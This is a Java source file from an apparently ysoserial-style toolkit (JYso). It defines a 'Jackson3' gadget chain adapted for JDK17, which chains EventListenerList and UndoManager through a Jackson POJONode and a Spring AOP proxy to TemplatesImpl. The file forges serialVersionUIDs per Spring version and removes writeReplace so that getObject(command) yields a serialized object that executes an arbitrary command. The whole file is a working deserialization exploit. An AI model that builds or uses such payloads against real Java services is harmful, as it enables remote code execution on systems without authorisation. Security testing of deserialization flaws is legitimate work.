package com.qi4l.JYso.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.SuClassLoader;
import com.qi4l.JYso.gadgets.utils.ThirdLibsClassLoader;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.AdvisorChainFactory;

import javax.sql.DataSource;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Vector;

import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
import static com.qi4l.JYso.gadgets.utils.Reflections.getFieldValue;
import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;


//Jackson2链的JDK17改造
@SuppressWarnings({"rawtypes", "unchecked","unused"})
@Dependencies({"spring-apo:6.2.10"})
@Authors({Authors.JSJCW})
public class Jackson3 implements ObjectPayload<Object>  {
    static InvocationHandler setSuidSource(AdvisedSupport advisedSupport) throws Exception  {
        //<=6.0.23为6115154060221772279
        //>=6.1.0 为273003553246259276
        String sUID = "273003553246259276";
        CtClass ctDefaultAdvisorChainFactory = insertField(
                "org.springframework.aop.framework.DefaultAdvisorChainFactory",
                "private static final long serialVersionUID = " + sUID + "L;");

        Object ctFactory = ctDefaultAdvisorChainFactory.toClass(
                new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
        ).getDeclaredConstructor().newInstance();
        advisedSupport.setAdvisorChainFactory((AdvisorChainFactory) ctFactory);

        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        return (InvocationHandler) constructor.newInstance(advisedSupport);
    }

    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));

        InvocationHandler handler = setSuidSource(advisedSupport);


        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
    }

    public static Object makeDatasourceAopProxy(Object templatesImpl) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);

        InvocationHandler handler = setSuidSource(advisedSupport);

        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler);
    }

    public static Object makeAopProxy(String singletonTargetSourceClassName, String advisedSupportClassName, String jdkDynamicAopProxy, Class superClass, Object targetObject) throws Exception {
        Object singletonTargetSource = ThirdLibsClassLoader.loadClass_(singletonTargetSourceClassName).getConstructor(Object.class).newInstance(targetObject);
        Class<?> advisedSupportClazz = ThirdLibsClassLoader.loadClass_(advisedSupportClassName);
        Object advisedSupport = advisedSupportClazz.getDeclaredConstructor().newInstance();
        advisedSupportClazz.getMethod("setTarget", Object.class).invoke(advisedSupport, singletonTargetSource);
        Constructor<?> constructor = ThirdLibsClassLoader.loadClass_(jdkDynamicAopProxy).getConstructor(advisedSupportClazz);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{superClass}, handler);
    }

    public static Object getEventListenerList(Object obj) throws Exception {
        //>=6.1.0 为-7977902244297240866
        //<=6.0.23为-5677132037850737084
        String sUID1 = "7977902244297240866";
        CtClass ctEventListenerList = insertField(
                "javax.swing.event.EventListenerList",
                "private static final long serialVersionUID = -" + sUID1 + "L;");
        Object list = ctEventListenerList.toClass(
                new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
        ).getDeclaredConstructor().newInstance();

        //>=6.1.0 为-1045223116463488483
        //<=6.0.23为-2077529998244066750
        String sUID2 = "1045223116463488483";
        CtClass ctUndoManager = insertField(
                "javax.swing.undo.UndoManager",
                "private static final long serialVersionUID = -" + sUID2 + "L;");
        Object undomanager = ctUndoManager.toClass(
                new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
        ).getDeclaredConstructor().newInstance();

        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(obj);

        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});
        return list;
    }

    @Override
    public Object getObject(final String command) throws Exception {
        try {
            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception ignored) {

        }


        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));

        return getEventListenerList(node);
    }
}